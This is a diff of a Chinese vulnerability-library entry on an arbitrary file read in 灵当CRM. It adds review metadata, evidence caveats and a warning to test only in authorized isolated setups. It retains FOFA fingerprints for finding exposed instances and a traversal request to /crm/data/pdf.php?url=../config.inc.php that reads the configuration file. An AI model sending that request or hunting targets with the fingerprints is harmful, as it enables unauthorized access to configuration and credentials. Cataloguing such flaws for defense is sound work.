@@ -1,23 +1,63 @@
 ---
-fofa: "body="
 source: "wy876 漏洞文库"
+title: "灵当CRM data/pdf.php url相对路径读取"
+product: "灵当CRM"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "配置文件位置，版本未知"
+prerequisites: "无Cookie示例"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/lbbo0kaxgwsh554t"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93%E4%BA%92%E5%8A%A8%E4%BF%A1%E6%81%AF/%E7%81%B5%E5%BD%93crmpdf%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "body="
+id: "vw-45d0acea54daf486ada04f90"
+entity_id: "ve-45d0acea54daf486ada04f90"
+schema_version: "1"
 ---
 
-# 灵当crm pdf存在任意文件读取漏洞
+# 灵当CRM data/pdf.php url相对路径读取
 
-# 一、漏洞简介
-<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm pdf存在任意文件读取漏洞。</font>
+## 条目说明
 
-# 二、影响版本
+- 对象与具体问题：灵当CRM；data/pdf.php url相对路径读取
+- 版本、配置及部署条件：配置文件位置，版本未知
+- 认证与权限前提：无Cookie示例
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- POST Content-Length2却无body，格式需修；参数在URL
+- 只有../config.inc.php无返回，读取所有文件/凭据需具体证据
+- 与auth_info静态缓存不是同漏洞；FOFA同模板污染，补版本修复
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+## 一、漏洞简介
+灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm pdf存在任意文件读取漏洞。
+
+## 二、影响版本
 + 灵当crm
 
-# 三、资产测绘
-+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `<font style="color:rgb(51, 51, 51);">body="crmcommon/js/jquery/jquery-1.10.1.min.js"</font>`
+## 三、资产测绘
++ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
 + 特征
 
 
-# 四、漏洞复现
-```plain
+## 四、漏洞复现
+```http
 POST /crm/data/pdf.php?url=../config.inc.php HTTP/1.1
 Host: 
 Content-Length: 2
